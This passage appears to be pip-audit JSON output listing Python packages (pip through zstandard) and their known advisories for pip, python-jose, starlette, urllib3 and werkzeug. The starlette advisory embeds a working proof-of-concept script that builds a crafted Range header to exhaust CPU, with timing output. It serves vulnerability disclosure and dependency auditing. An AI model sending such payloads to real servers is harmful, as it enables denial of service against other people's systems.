directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.4.0", "vulns": []}, {"name": "playwright", "version": "1.56.0", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "policy-sentry", "version": "0.13.2", "vulns": []}, {"name": "posthog", "version": "4.0.1", "vulns": []}, {"name": "pre-commit", "version": "4.3.0", "vulns": []}, {"name": "prettytable", "version": "3.16.0", "vulns": []}, {"name": "primp", "version": "0.15.0", "vulns": []}, {"name": "prometheus-client", "version": "0.21.0", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.51", "vulns": []}, {"name": "propcache", "version": "0.3.1", "vulns": []}, {"name": "proto-plus", "version": "1.26.1", "vulns": []}, {"name": "protobuf", "version": "6.33.2", "vulns": []}, {"name": "psutil", "version": "7.1.3", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.3", "vulns": []}, {"name": "py-serializable", "version": "1.1.2", "vulns": []}, {"name": "py7zr", "version": "1.0.0", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pyasn1-modules", "version": "0.4.2", "vulns": []}, {"name": "pybcj", "version": "1.0.6", "vulns": []}, {"name": "pycares", "version": "4.11.0", "vulns": []}, {"name": "pycep-parser", "version": "0.5.1", "vulns": []}, {"name": "pycodestyle", "version": "2.14.0", "vulns": []}, {"name": "pycparser", "version": "2.22", "vulns": []}, {"name": "pycryptodomex", "version": "3.23.0", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pydantic-settings", "version": "2.11.0", "vulns": []}, {"name": "pydub", "version": "0.25.1", "vulns": []}, {"name": "pydyf", "version": "0.11.0", "vulns": []}, {"name": "pyee", "version": "13.0.0", "vulns": []}, {"name": "pyflakes", "version": "3.4.0", "vulns": []}, {"name": "pygments", "version": "2.19.1", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pymongo", "version": "4.15.5", "vulns": []}, {"name": "pymssql", "version": "2.3.8", "vulns": []}, {"name": "pyodbc", "version": "5.3.0", "vulns": []}, {"name": "pyotp", "version": "2.9.0", "vulns": []}, {"name": "pypandoc", "version": "1.15", "vulns": []}, {"name": "pyparsing", "version": "3.2.3", "vulns": []}, {"name": "pyperclip", "version": "1.9.0", "vulns": []}, {"name": "pyphen", "version": "0.17.2", "vulns": []}, {"name": "pyppmd", "version": "1.2.0", "vulns": []}, {"name": "pysocks", "version": "1.7.1", "vulns": []}, {"name": "pytest", "version": "8.4.2", "vulns": []}, {"name": "pytest-asyncio", "version": "1.2.0", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.2.1", "vulns": []}, {"name": "python-editor", "version": "1.0.4", "vulns": []}, {"name": "python-jose", "version": "3.3.0", "vulns": [{"id": "PYSEC-2024-232", "fix_versions": ["3.4.0"], "aliases": ["CVE-2024-33663"], "description": "python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats. This is similar to CVE-2022-29217."}, {"id": "PYSEC-2024-233", "fix_versions": ["3.4.0"], "aliases": ["CVE-2024-33664"], "description": "python-jose through 3.3.0 allows attackers to cause a denial of service (resource consumption) during a decode via a crafted JSON Web Encryption (JWE) token with a high compression ratio, aka a \"JWT bomb.\" This is similar to CVE-2024-21319."}]}, {"name": "python-json-logger", "version": "2.0.7", "vulns": []}, {"name": "python-levenshtein", "version": "0.27.1", "vulns": []}, {"name": "python-multipart", "version": "0.0.20", "vulns": []}, {"name": "pytokens", "version": "0.3.0", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pyvis", "version": "0.3.2", "vulns": []}, {"name": "pyyaml", "version": "6.0.2", "vulns": []}, {"name": "pyzmq", "version": "27.1.0", "vulns": []}, {"name": "pyzstd", "version": "0.18.0", "vulns": []}, {"name": "qrcode", "version": "8.2", "vulns": []}, {"name": "rapidfuzz", "version": "3.13.0", "vulns": []}, {"name": "rdflib", "version": "7.5.0", "vulns": []}, {"name": "readchar", "version": "4.2.1", "vulns": []}, {"name": "redis", "version": "7.0.1", "vulns": []}, {"name": "referencing", "version": "0.36.2", "vulns": []}, {"name": "regex", "version": "2024.11.6", "vulns": []}, {"name": "reportlab", "version": "4.4.7", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "requests-oauthlib", "version": "2.0.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rich", "version": "13.9.4", "vulns": []}, {"name": "rpds-py", "version": "0.24.0", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.17.40", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.15", "vulns": []}, {"name": "ruff", "version": "0.14.5", "vulns": []}, {"name": "runs", "version": "1.2.2", "vulns": []}, {"name": "rustworkx", "version": "0.17.1", "vulns": []}, {"name": "s3transfer", "version": "0.10.4", "vulns": []}, {"name": "safetensors", "version": "0.7.0", "vulns": []}, {"name": "safety", "version": "3.7.0", "vulns": []}, {"name": "safety-schemas", "version": "0.0.16", "vulns": []}, {"name": "sarif-om", "version": "1.0.4", "vulns": []}, {"name": "schema", "version": "0.7.5", "vulns": []}, {"name": "scikit-learn", "version": "1.6.1", "vulns": []}, {"name": "scipy", "version": "1.13.1", "vulns": []}, {"name": "selenium", "version": "4.36.0", "vulns": []}, {"name": "semantic-version", "version": "2.10.0", "vulns": []}, {"name": "semgrep", "version": "1.86.0", "vulns": []}, {"name": "send2trash", "version": "1.8.3", "vulns": []}, {"name": "sentence-transformers", "version": "5.1.2", "vulns": []}, {"name": "sentry-sdk", "version": "2.18.0", "vulns": []}, {"name": "setuptools", "version": "80.9.0", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "shortuuid", "version": "1.0.13", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "socksio", "version": "1.0.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "sounddevice", "version": "0.5.1", "vulns": []}, {"name": "soundfile", "version": "0.13.1", "vulns": []}, {"name": "soupsieve", "version": "2.7", "vulns": []}, {"name": "spdx-tools", "version": "0.8.3", "vulns": []}, {"name": "speckit", "version": "1.0.1", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.44", "vulns": []}, {"name": "stack-data", "version": "0.6.3", "vulns": []}, {"name": "starlette", "version": "0.41.3", "vulns": [{"id": "GHSA-2c2j-9gv5-cj73", "fix_versions": ["0.47.2"], "aliases": ["CVE-2025-54121"], "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."}, {"id": "GHSA-7f5h-v6xp-fcq8", "fix_versions": ["0.49.1"], "aliases": ["CVE-2025-62727"], "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header."}]}, {"name": "stevedore", "version": "5.5.0", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tenacity", "version": "8.5.0", "vulns": []}, {"name": "termcolor", "version": "2.3.0", "vulns": []}, {"name": "texttable", "version": "1.7.0", "vulns": []}, {"name": "threadpoolctl", "version": "3.6.0", "vulns": []}, {"name": "tiktoken", "version": "0.5.2", "vulns": []}, {"name": "tinycss2", "version": "1.4.0", "vulns": []}, {"name": "tinyhtml5", "version": "2.0.0", "vulns": []}, {"name": "tokenizers", "version": "0.22.1", "vulns": []}, {"name": "tokentrim", "version": "0.1.13", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.0.2", "vulns": []}, {"name": "tomlkit", "version": "0.13.3", "vulns": []}, {"name": "torch", "version": "2.8.0", "vulns": []}, {"name": "tornado", "version": "6.5.3", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "transformers", "version": "4.57.3", "vulns": []}, {"name": "tree-sitter", "version": "0.23.2", "vulns": []}, {"name": "tree-sitter-c-sharp", "version": "0.23.1", "vulns": []}, {"name": "tree-sitter-embedded-template", "version": "0.23.2", "vulns": []}, {"name": "tree-sitter-language-pack", "version": "0.7.2", "vulns": []}, {"name": "tree-sitter-yaml", "version": "0.7.0", "vulns": []}, {"name": "trio", "version": "0.31.0", "vulns": []}, {"name": "trio-websocket", "version": "0.12.2", "vulns": []}, {"name": "typer", "version": "0.20.0", "vulns": []}, {"name": "types-cachetools", "version": "6.2.0.20251022", "vulns": []}, {"name": "types-decorator", "version": "5.2.0.20251101", "vulns": []}, {"name": "types-pyyaml", "version": "6.0.12.20250915", "vulns": []}, {"name": "types-requests", "version": "2.32.4.20250913", "vulns": []}, {"name": "types-ujson", "version": "5.10.0.20250822", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspect", "version": "0.9.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tzdata", "version": "2025.3", "vulns": []}, {"name": "ujson", "version": "5.10.0", "vulns": []}, {"name": "unidiff", "version": "0.7.5", "vulns": []}, {"name": "uritemplate", "version": "4.1.1", "vulns": []}, {"name": "uritools", "version": "5.0.0", "vulns": []}, {"name": "urllib3", "version": "1.26.20", "vulns": [{"id": "GHSA-pq67-6m6q-mj2v", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50181"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}, {"id": "GHSA-gm62-xv2j-4w53", "fix_versions": ["2.6.0"], "aliases": ["CVE-2025-66418"], "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."}, {"id": "GHSA-2xpw-w6gg-jr37", "fix_versions": ["2.6.0"], "aliases": ["CVE-2025-66471"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."}]}, {"name": "uvicorn", "version": "0.34.0", "vulns": []}, {"name": "uvloop", "version": "0.22.1", "vulns": []}, {"name": "vine", "version": "5.1.0", "vulns": []}, {"name": "virtualenv", "version": "20.35.4", "vulns": []}, {"name": "watchfiles", "version": "1.0.5", "vulns": []}, {"name": "wcmatch", "version": "8.5.2", "vulns": []}, {"name": "wcwidth", "version": "0.2.13", "vulns": []}, {"name": "weasyprint", "version": "66.0", "vulns": []}, {"name": "webdriver-manager", "version": "4.0.2", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.9.0", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.3", "vulns": [{"id": "GHSA-hgf8-39gv-g3f2", "fix_versions": ["3.1.4"], "aliases": ["CVE-2025-66221"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}]}, {"name": "wget", "version": "3.2", "vulns": []}, {"name": "wheel", "version": "0.45.1", "vulns": []}, {"name": "wrapt", "version": "1.17.3", "vulns": []}, {"name": "wsproto", "version": "1.2.0", "vulns": []}, {"name": "xlsxwriter", "version": "3.2.9", "vulns": []}, {"name": "xmltodict", "version": "1.0.2", "vulns": []}, {"name": "xmod", "version": "1.8.1", "vulns": []}, {"name": "xxhash", "version": "3.6.0", "vulns": []}, {"name": "yarl", "version": "1.20.0", "vulns": []}, {"name": "yaspin", "version": "3.3.0", "vulns": []}, {"name": "zeroconf", "version": "0.148.0", "vulns": []}, {"name": "zipp", "version": "3.21.0", "vulns": []}, {"name": "zope-event", "version": "6.0", "vulns": []}, {"name": "zope-interface", "version": "8.0.1", "vulns": []}, {"name": "zopfli", "version": "0.2.3.post1", "vulns": []}, {"name": "zstandard", "version": "0.25.0", "vulns": []}], "fixes": []}
